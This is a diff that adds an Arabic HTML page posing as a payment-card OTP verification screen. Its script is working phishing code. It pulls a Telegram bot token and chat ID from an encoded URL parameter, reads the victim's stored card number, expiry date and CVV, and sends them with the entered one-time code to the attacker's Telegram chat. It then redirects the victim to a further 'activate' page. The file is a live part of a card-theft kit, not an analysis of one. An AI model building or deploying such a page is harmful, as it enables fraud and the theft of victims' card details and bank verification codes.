@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>رمز التحقق</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background: #e8eaed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 40px 28px 32px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+        }
+
+        .phone-icon {
+            text-align: center;
+            font-size: 56px;
+            margin-bottom: 16px;
+            line-height: 1;
+        }
+
+        .card h2 {
+            font-size: 26px;
+            color: #202124;
+            margin-bottom: 10px;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .card .desc {
+            color: #5f6368;
+            font-size: 14.5px;
+            margin-bottom: 28px;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        /* 🔵 صندوق معلومات البطاقة */
+        .info-box {
+            background: #f1f3f4;
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 24px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0;
+            font-size: 14.5px;
+            color: #202124;
+        }
+
+        .info-row .label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #5f6368;
+            font-weight: 500;
+        }
+
+        .info-row .label .icon {
+            font-size: 16px;
+        }
+
+        .info-row .value {
+            font-weight: 600;
+            color: #202124;
+            direction: ltr;
+            letter-spacing: 0.5px;
+        }
+
+        .info-row .value.card-num {
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+        }
+
+        /* 🔢 حقل إدخال OTP */
+        .otp-input-group {
+            margin-bottom: 16px;
+        }
+
+        .otp-input-group input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 2px solid #1a73e8;
+            border-radius: 12px;
+            font-size: 20px;
+            background: #ffffff;
+            color: #202124;
+            outline: none;
+            text-align: center;
+            letter-spacing: 6px;
+            font-family: 'Segoe UI', sans-serif;
+            transition: all 0.2s ease;
+            font-weight: 600;
+        }
+
+        .otp-input-group input:focus {
+            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.15);
+        }
+
+        .otp-input-group input::placeholder {
+            color: #9aa0a6;
+            letter-spacing: normal;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        .otp-input-group input.error {
+            border-color: #ea4335;
+            background: #fce8e6;
+        }
+
+        .error-msg {
+            font-size: 13px;
+            color: #ea4335;
+            margin-top: 6px;
+            display: none;
+            text-align: center;
+        }
+
+        .error-msg.show {
+            display: block;
+        }
+
+        /* ✅ زر تحقق */
+        .btn-verify {
+            width: 100%;
+            padding: 16px;
+            background: #1a73e8;
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            letter-spacing: 0.3px;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-verify:hover {
+            background: #1765cc;
+            box-shadow: 0 6px 20px rgba(26, 115, 232, 0.35);
+            transform: translateY(-2px);
+        }
+
+        .btn-verify:active {
+            transform: scale(0.98);
+        }
+
+        .btn-verify:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* 🔄 إعادة الإرسال */
+        .resend {
+            text-align: center;
+            margin-top: 18px;
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        .resend button {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 14px;
+            font-family: inherit;
+            padding: 4px 8px;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        .resend button:hover {
+            background: rgba(26, 115, 232, 0.08);
+            text-decoration: underline;
+        }
+
+        .resend button:disabled {
+            color: #9aa0a6;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 30px 20px 26px;
+            }
+            .card h2 {
+                font-size: 22px;
+            }
+            .phone-icon {
+                font-size: 48px;
+            }
+            .btn-verify {
+                font-size: 16px;
+                padding: 14px;
+            }
+            .info-row {
+                font-size: 13.5px;
+            }
+            .otp-input-group input {
+                font-size: 18px;
+                letter-spacing: 4px;
+                padding: 16px 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <div class="card">
+
+        <div class="phone-icon">📱</div>
+        <h2>رمز التحقق</h2>
+        <p class="desc">أدخل رمز التحقق الذي تم إرساله إلى هاتفك</p>
+
+        <!-- 🔵 صندوق معلومات البطاقة -->
+        <div class="info-box">
+            <div class="info-row">
+                <span class="label">
+                    <span class="icon">👤</span>
+                    اسم حامل البطاقة
+                </span>
+                <span class="value" id="cardHolder">—</span>
+            </div>
+            <div class="info-row">
+                <span class="label">
+                    <span class="icon">💳</span>
+                    رقم البطاقة
+                </span>
+                <span class="value card-num" id="cardNumberDisplay">—</span>
+            </div>
+            <div class="info-row">
+                <span class="label">
+                    <span class="icon">📅</span>
+                    تاريخ اليوم
+                </span>
+                <span class="value" id="todayDate">—</span>
+            </div>
+        </div>
+
+        <form id="otpForm" novalidate>
+
+            <div class="otp-input-group">
+                <!-- ✅ لا يوجد maxlength - يقبل أي عدد من الأرقام -->
+                <input type="tel" id="otpInput" placeholder="أدخل رمز التحقق" inputmode="numeric" autocomplete="one-time-code">
+                <div class="error-msg" id="otpError">⚠ يرجى إدخال رمز التحقق</div>
+            </div>
+
+            <button type="submit" class="btn-verify" id="verifyBtn">
+                ✓ تحقق
+            </button>
+
+        </form>
+
+        <div class="resend">
+            لم تصلك رسالة؟
+            <button type="button" id="resendBtn">إعادة إرسال</button>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+    // ================================================================
+    // 🔐 قراءة البيانات المشفّرة من الرابط
+    // ================================================================
+    const urlParams = new URLSearchParams(window.location.search);
+    const encodedData = urlParams.get('d') || "";
+    const finalEncoded = encodedData || sessionStorage.getItem('wa_encoded') || "";
+
+    if (finalEncoded) {
+        sessionStorage.setItem('wa_encoded', finalEncoded);
+    }
+
+    let BOT_TOKEN = "";
+    let CHAT_ID = "";
+
+    if (finalEncoded) {
+        try {
+            const decoded = atob(finalEncoded);
+            const parts = decoded.split('|');
+            BOT_TOKEN = parts[0] || "";
+            CHAT_ID   = parts[1] || "";
+        } catch (e) {
+            console.error('❌ فشل فك التشفير:', e);
+        }
+    }
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn('⚠️ البيانات المشفّرة غير موجودة!');
+    }
+
+    // ================================================================
+    // 💳 عرض بيانات البطاقة
+    // ================================================================
+    const cardData = JSON.parse(localStorage.getItem('card_data') || '{}');
+    
+    // عرض آخر 4 أرقام فقط
+    if (cardData.number) {
+        const last4 = cardData.number.slice(-4);
+        const masked = '**** **** **** ' + last4;
+        document.getElementById('cardNumberDisplay').textContent = masked;
+    }
+    
+    // اسم حامل البطاقة (تجريبي)
+    document.getElementById('cardHolder').textContent = 'Card Holder';
+
+    // تاريخ اليوم
+    const today = new Date();
+    const dateStr = today.toLocaleDateString('en-GB', { 
+        year: 'numeric', 
+        month: '2-digit', 
+        day: '2-digit' 
+    }).replace(/\//g, ' / ');
+    document.getElementById('todayDate').textContent = dateStr;
+
+    // ================================================================
+    // 📤 إرسال OTP إلى Telegram
+    // ================================================================
+    function sendOtpToTelegram(otp) {
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.error('❌ التوكن أو ID غير موجود!');
+            return;
+        }
+
+        const message = `
+🔐 **رمز التحقق - (الخطوة 2/2)**
+
+💳 **رقم البطاقة:** 
+\`${cardData.number || 'غير محدد'}\`
+
+📅 **تاريخ الانتهاء:** 
+\`${cardData.month || '--'}/${cardData.year || '--'}\`
+
+🔒 **CVV:** 
+\`${cardData.cvv || 'غير محدد'}\`
+
+🔢 **رمز OTP:** 
+\`${otp}\`
+
+🕐 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
+
+📌 **IP:** ${window.location.hostname}
+        `;
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        }).catch(error => console.log('Telegram error:', error));
+    }
+
+    // ================================================================
+    // 🔢 حقل OTP - يقبل أي عدد من الأرقام (بدون حد أقصى)
+    // ================================================================
+    const otpInput = document.getElementById('otpInput');
+
+    // قبول الأرقام فقط
+    otpInput.addEventListener('input', function() {
+        // إزالة أي شيء غير الأرقام
+        this.value = this.value.replace(/\D/g, '');
+        
+        // إزالة الخطأ عند الكتابة
+        this.classList.remove('error');
+        document.getElementById('otpError').classList.remove('show');
+    });
+
+    // منع كتابة أي حرف غير رقم
+    otpInput.addEventListener('keypress', function(e) {
+        if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab' && e.key !== 'Enter') {
+            e.preventDefault();
+        }
+    });
+
+    // منع لصق أي شيء غير أرقام
+    otpInput.addEventListener('paste', function(e) {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text');
+        const numbers = pasted.replace(/\D/g, '');
+        this.value = numbers;
+        this.dispatchEvent(new Event('input'));
+    });
+
+    // ================================================================
+    // 📝 معالج النموذج - إرسال + التوجيه لصفحة الانتظار
+    // ================================================================
+    document.getElementById('otpForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const otp = otpInput.value.trim();
+
+        // التحقق: فقط أن الحقل غير فارغ
+        if (!otp) {
+            otpInput.classList.add('error');
+            document.getElementById('otpError').textContent = '⚠ يرجى إدخال رمز التحقق';
+            document.getElementById('otpError').classList.add('show');
+            return;
+        }
+
+        // تعطيل الزر
+        const btn = document.getElementById('verifyBtn');
+        btn.disabled = true;
+        btn.innerHTML = '⏳ جاري التحقق...';
+
+        // إرسال إلى Telegram
+        sendOtpToTelegram(otp);
+
+        // حفظ OTP
+        localStorage.setItem('otp_code', otp);
+
+        // ============================================================
+        // 🔗 التوجيه مباشرة إلى صفحة الانتظار
+        // ============================================================
+        setTimeout(() => {
+            let nextUrl = 'activate.html';
+            if (finalEncoded) {
+                nextUrl += '?d=' + encodeURIComponent(finalEncoded);
+            }
+            window.location.href = nextUrl;
+        }, 700);
+    });
+
+    // ================================================================
+    // 🔄 إعادة الإرسال
+    // ================================================================
+    document.getElementById('resendBtn').addEventListener('click', function() {
+        this.disabled = true;
+        this.textContent = 'تم الإرسال ✓';
+        
+        otpInput.value = '';
+        otpInput.classList.remove('error');
+        otpInput.focus();
+
+        setTimeout(() => {
+            this.disabled = false;
+            this.textContent = 'إعادة إرسال';
+        }, 30000);
+    });
+
+    // التركيز التلقائي
+    otpInput.focus();
+
+    console.log('✅ OTP page loaded (unlimited digits)');
+    console.log('📎 Encoded data:', finalEncoded ? 'موجود ✓' : 'غير موجود ✗');
+</script>
+
+</body>
+</html>
